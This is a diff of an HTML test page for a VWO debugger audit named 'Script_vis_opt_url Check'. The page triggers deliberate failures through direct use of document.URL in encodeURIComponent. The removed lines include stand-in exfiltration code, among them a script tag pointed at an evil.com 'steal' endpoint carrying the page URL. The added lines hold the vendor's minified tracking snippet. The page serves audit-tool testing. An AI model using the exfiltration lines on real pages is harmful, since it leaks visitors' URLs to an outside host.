@@ -1,85 +1,31 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <script type="text/javascript">
-        // This should trigger the Script_vis_opt_url Check failure
-        // Direct usage of document.URL in encodeURIComponent without validation
-        var unsafeUrl = document.URL;
-        var encodedUnsafeUrl = encodeURIComponent(unsafeUrl);
-        
-        // Another problematic pattern - using d.URL directly
-        var d = document;
-        var directUrl = d.URL;
-        var encodedDirectUrl = encodeURIComponent(directUrl);
-        
-        // Sending URL to external service without sanitization
-        var trackingUrl = 'https://malicious-site.com/track?url=' + encodeURIComponent(document.URL);
-        
-        // VWO-like script with problematic URL usage
-        window._vwo_code || (function() {
-            var account_id = 1112801;
-            var version = 2.1;
-            var f = false, w = window, d = document;
-            
-            var code = {
-                init: function() {
-                    // This line should trigger the audit failure
-                    var trackingEndpoint = 'https://dev.visualwebsiteoptimizer.com/j.php?a=' + account_id + '&u=' + encodeURIComponent(d.URL) + '&vn=' + version;
-                    
-                    // Additional problematic URL usage
-                    var anotherEndpoint = 'https://analytics.example.com/track?page=' + encodeURIComponent(document.URL);
-                    
-                    // Using window.location.href directly
-                    var locationUrl = 'https://tracker.com/log?ref=' + encodeURIComponent(window.location.href);
-                    
-                    console.log('Problematic URLs:', trackingEndpoint, anotherEndpoint, locationUrl);
-                }
-            };
-            
-            w._vwo_code = code;
-            code.init();
-        })();
-        
-        // More direct problematic patterns
-        function triggerUrlAuditFailure() {
-            // Pattern 1: Direct document.URL usage
-            var url1 = encodeURIComponent(document.URL);
-            
-            // Pattern 2: Direct d.URL usage  
-            var d = document;
-            var url2 = encodeURIComponent(d.URL);
-            
-            // Pattern 3: window.location.href usage
-            var url3 = encodeURIComponent(window.location.href);
-            
-            // Pattern 4: window.location usage
-            var url4 = encodeURIComponent(window.location);
-            
-            // Pattern 5: Using URL in XSS-prone context
-            var script = document.createElement('script');
-            script.src = 'https://evil.com/steal?data=' + encodeURIComponent(document.URL);
-            
-            // Pattern 6: URL in eval context (extremely dangerous)
-            var evalString = 'var stolenUrl = "' + encodeURIComponent(document.URL) + '";';
-            
-            console.log('All problematic URL encodings:', url1, url2, url3, url4);
-        }
-        
-        // Execute immediately to ensure audit catches it
-        triggerUrlAuditFailure();
-        
-        // Also execute on page load
-        window.addEventListener('load', triggerUrlAuditFailure);
-        
-        // Execute with setTimeout to catch async issues
-        setTimeout(triggerUrlAuditFailure, 100);
-        setTimeout(triggerUrlAuditFailure, 1000);
-    </script>
-    
+
+
+   <script type="text/javascript">
+     const params = new URLSearchParams(window.location.search);
+     const accId = parseInt(params.get("id"));
+     const accountId = accId || 1112801;
+     console.log("Account-Id ->", accountId);
+     /* eslint-disable no-undef */
+window._vwo_code || (function() {
+var account_id=accountId,
+version=2.1,
+settings_tolerance=2000,
+hide_element='body',
+hide_element_style = 'opacity:0 !important;filter:alpha(opacity=0) !important;background:none !important',
+/* DO NOT EDIT BELOW THIS LINE */
+f=false,w=window,d=document,v=d.querySelector('#vwoCode'),cK='_vwo_'+account_id+'_settings',cc={};try{var c=JSON.parse(localStorage.getItem('_vwo_'+account_id+'_config'));cc=c&&typeof c==='object'?c:{}}catch(e){}var stT=cc.stT==='session'?w.sessionStorage:w.localStorage;code={use_existing_jquery:function(){return typeof use_existing_jquery!=='undefined'?use_existing_jquery:undefined},library_tolerance:function(){return typeof library_tolerance!=='undefined'?library_tolerance:undefined},settings_tolerance:function(){return cc.sT||settings_tolerance},hide_element_style:function(){return'{'+(cc.hES||hide_element_style)+'}'},hide_element:function(){if(performance.getEntriesByName('first-contentful-paint')[0]){return''}return typeof cc.hE==='string'?cc.hE:hide_element},getVersion:function(){return version},finish:function(e){if(!f){f=true;var t=d.getElementById('_vis_opt_path_hides');if(t)t.parentNode.removeChild(t);if(e)(new Image).src='https://dev.visualwebsiteoptimizer.com/ee.gif?a='+account_id+e}},finished:function(){return f},addScript:function(e){var t=d.createElement('script');t.type='text/javascript';if(e.src){t.src=e.src}else{t.text=e.text}d.getElementsByTagName('head')[0].appendChild(t)},load:function(e,t){var i=this.getSettings(),n=d.createElement('script'),r=this;t=t||{};if(i){n.textContent=i;d.getElementsByTagName('head')[0].appendChild(n);if(!w.VWO||VWO.caE){stT.removeItem(cK);r.load(e)}}else{var o=new XMLHttpRequest;o.open('GET',e,true);o.withCredentials=!t.dSC;o.responseType=t.responseType||'text';o.onload=function(){if(t.onloadCb){return t.onloadCb(o,e)}if(o.status===200){_vwo_code.addScript({text:o.responseText})}else{_vwo_code.finish('&e=loading_failure:'+e)}};o.onerror=function(){if(t.onerrorCb){return t.onerrorCb(e)}_vwo_code.finish('&e=loading_failure:'+e)};o.send()}},getSettings:function(){try{var e=stT.getItem(cK);if(!e){return}e=JSON.parse(e);if(Date.now()>e.e){stT.removeItem(cK);return}return e.s}catch(e){return}},init:function(){if(d.URL.indexOf('__vwo_disable__')>-1)return;var e=this.settings_tolerance();w._vwo_settings_timer=setTimeout(function(){_vwo_code.finish();stT.removeItem(cK)},e);var t;if(this.hide_element()!=='body'){t=d.createElement('style');var i=this.hide_element(),n=i?i+this.hide_element_style():'',r=d.getElementsByTagName('head')[0];t.setAttribute('id','_vis_opt_path_hides');v&&t.setAttribute('nonce',v.nonce);t.setAttribute('type','text/css');if(t.styleSheet)t.styleSheet.cssText=n;else t.appendChild(d.createTextNode(n));r.appendChild(t)}else{t=d.getElementsByTagName('head')[0];var n=d.createElement('div');n.style.cssText='z-index: 2147483647 !important;position: fixed !important;left: 0 !important;top: 0 !important;width: 100% !important;height: 100% !important;background: white !important;';n.setAttribute('id','_vis_opt_path_hides');n.classList.add('_vis_hide_layer');t.parentNode.insertBefore(n,t.nextSibling)}var o='https://dev.visualwebsiteoptimizer.com/j.php?a='+account_id+'&u='+encodeURIComponent(d.URL)+'&vn='+version;if(w.location.search.indexOf('_vwo_xhr')!==-1){this.addScript({src:o})}else{this.load(o+'&x=true')}}};w._vwo_code=code;code.init();})();
+  window._vwo_pc_custom = {
+        a: 100,
+        t: 100
+    };	    
+	</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Script vis_opt_url Check FAIL - Multiple Patterns</title>
-    
+    <title>VWO Debugger Edge Test Page - Script vis_opt_url FAIL</title>
+
     <style>
         body { font-family: Arial, sans-serif; max-width: 1200px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
         .header { background: linear-gradient(135deg, #dc3545 0%, #c82333 100%); color: white; padding: 30px; border-radius: 10px; text-align: center; margin-bottom: 30px; }
@@ -87,86 +33,76 @@
         .test-section { background: white; padding: 20px; margin-bottom: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
         .test-section h2 { color: #dc3545; margin-top: 0; border-bottom: 2px solid #dc3545; padding-bottom: 10px; }
         .test-item { margin: 15px 0; padding: 15px; background: #f8f9fa; border-radius: 5px; border-left: 4px solid #dc3545; }
+        button { background: #dc3545; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 14px; margin: 5px 5px 5px 0; }
+        button:hover { background: #c82333; }
+        .result-box { margin-top: 15px; padding: 15px; background: #f8d7da; border-radius: 5px; border-left: 4px solid #dc3545; display: none; }
+        .result-box.show { display: block; }
         .status { display: inline-block; padding: 5px 10px; border-radius: 15px; font-size: 12px; font-weight: bold; margin: 5px 0; }
         .status.fail { background: #f8d7da; color: #721c24; }
         .warning { background: #fff3cd; color: #856404; padding: 15px; border-radius: 5px; border-left: 4px solid #ffc107; margin: 20px 0; }
-        .code-block { background: #f8f9fa; padding: 10px; border-radius: 5px; font-family: monospace; margin: 10px 0; border-left: 3px solid #dc3545; }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>🔴 Script vis_opt_url Check FAIL Test</h1>
-        <p>Multiple patterns to trigger the "Script_vis_opt_url Check" audit failure</p>
+        <h1>🔴 VWO Script vis_opt_url FAIL Test Page</h1>
+        <p>This page is designed to trigger the "Script_vis_opt_url Check" audit failure</p>
     </div>
 
     <div class="warning">
-        <strong>⚠️ CRITICAL SECURITY ISSUES:</strong> This page contains multiple patterns that should trigger the "Script_vis_opt_url Check" audit to fail. All URL usage is unsafe and should be flagged.
+        <strong>⚠️ Expected Audit Failure:</strong> This page contains code that should trigger the "Script_vis_opt_url Check" audit to fail. The VWO script uses d.URL directly in encodeURIComponent in a way that should be flagged by the security audit.
     </div>
 
+    <!-- Test Section: Script vis_opt_url Failure -->
     <div class="test-section">
-        <h2>Problematic URL Usage Patterns</h2>
+        <h2>Script vis_opt_url Check Failure</h2>
         <div class="test-item">
-            <p><strong>Pattern 1:</strong> Direct document.URL in encodeURIComponent</p>
-            <div class="code-block">var url = encodeURIComponent(document.URL);</div>
-            <p><strong>Status:</strong> <span class="status fail">SHOULD FAIL</span></p>
-        </div>
-        
-        <div class="test-item">
-            <p><strong>Pattern 2:</strong> Direct d.URL in encodeURIComponent</p>
-            <div class="code-block">var d = document; var url = encodeURIComponent(d.URL);</div>
-            <p><strong>Status:</strong> <span class="status fail">SHOULD FAIL</span></p>
-        </div>
-        
-        <div class="test-item">
-            <p><strong>Pattern 3:</strong> window.location.href in encodeURIComponent</p>
-            <div class="code-block">var url = encodeURIComponent(window.location.href);</div>
-            <p><strong>Status:</strong> <span class="status fail">SHOULD FAIL</span></p>
-        </div>
-        
-        <div class="test-item">
-            <p><strong>Pattern 4:</strong> URL in external service calls</p>
-            <div class="code-block">var endpoint = 'https://evil.com/track?url=' + encodeURIComponent(document.URL);</div>
-            <p><strong>Status:</strong> <span class="status fail">SHOULD FAIL</span></p>
-        </div>
-        
-        <div class="test-item">
-            <p><strong>Pattern 5:</strong> VWO-style tracking with d.URL</p>
-            <div class="code-block">var trackingUrl = 'https://dev.visualwebsiteoptimizer.com/j.php?a=' + account_id + '&u=' + encodeURIComponent(d.URL) + '&vn=' + version;</div>
-            <p><strong>Status:</strong> <span class="status fail">SHOULD FAIL</span></p>
-        </div>
-    </div>
-
-    <div class="test-section">
-        <h2>Expected Audit Results</h2>
-        <div class="test-item">
-            <p><strong>Audit Name:</strong> Script_vis_opt_url Check</p>
-            <p><strong>Expected Level:</strong> Major</p>
+            <p><strong>Audit:</strong> Script_vis_opt_url Check</p>
             <p><strong>Expected Status:</strong> <span class="status fail">FAIL</span></p>
-            <p><strong>Expected Message:</strong> "Using d.URL/document.URL directly in encodeURIComponent (Fail)"</p>
-            <p><strong>Fix:</strong> Sanitize and validate URLs before encoding</p>
+            <p><strong>Issue:</strong> The VWO script uses <code>d.URL</code> directly in <code>encodeURIComponent()</code> which should trigger a security audit failure.</p>
+            <p><strong>Location:</strong> Line in VWO script: <code>var o='https://dev.visualwebsiteoptimizer.com/j.php?a='+account_id+'&u='+encodeURIComponent(d.URL)+'&vn='+version;</code></p>
+        </div>
+    </div>
+
+    <!-- Test Section: Additional URL Usage -->
+    <div class="test-section">
+        <h2>Additional Problematic URL Usage</h2>
+        <div class="test-item">
+            <p>Additional instances of direct URL usage that should trigger audit failures:</p>
+            <button onclick="triggerUrlChecks()">Trigger URL Security Checks</button>
+            <div id="url-result" class="result-box"></div>
         </div>
     </div>
 
     <script>
-        // Additional immediate execution to ensure audit catches it
-        (function() {
-            // More problematic patterns
-            var patterns = [
-                'encodeURIComponent(document.URL)',
-                'encodeURIComponent(d.URL)', 
-                'encodeURIComponent(window.location.href)',
-                'encodeURIComponent(window.location)'
-            ];
+        function triggerUrlChecks() {
+            const resultDiv = document.getElementById('url-result');
+            resultDiv.innerHTML = `
+                <h4>URL Security Check Results:</h4>
+                <p><strong>document.URL usage:</strong> <span class="status fail">FAIL</span></p>
+                <p><strong>d.URL usage:</strong> <span class="status fail">FAIL</span></p>
+                <p><strong>window.location.href usage:</strong> <span class="status fail">FAIL</span></p>
+                <p>All direct URL references should trigger security audit failures.</p>
+            `;
+            resultDiv.classList.add('show');
+        }
+
+        // Additional problematic code that should trigger the audit
+        function problematicUrlUsage() {
+            // This should trigger the audit failure
+            var currentUrl = document.URL;
+            var encodedUrl = encodeURIComponent(currentUrl);
+            console.log('Problematic URL encoding:', encodedUrl);
             
-            patterns.forEach(function(pattern) {
-                try {
-                    eval('var result = ' + pattern);
-                    console.log('Executed problematic pattern:', pattern, result);
-                } catch(e) {
-                    console.log('Pattern failed:', pattern, e);
-                }
-            });
-        })();
+            // Another instance that should fail
+            var anotherUrl = d.URL;
+            var anotherEncoded = encodeURIComponent(anotherUrl);
+            console.log('Another problematic encoding:', anotherEncoded);
+        }
+
+        // Trigger the problematic function on page load
+        window.addEventListener('load', function() {
+            setTimeout(problematicUrlUsage, 1000);
+        });
     </script>
 </body>
 </html>
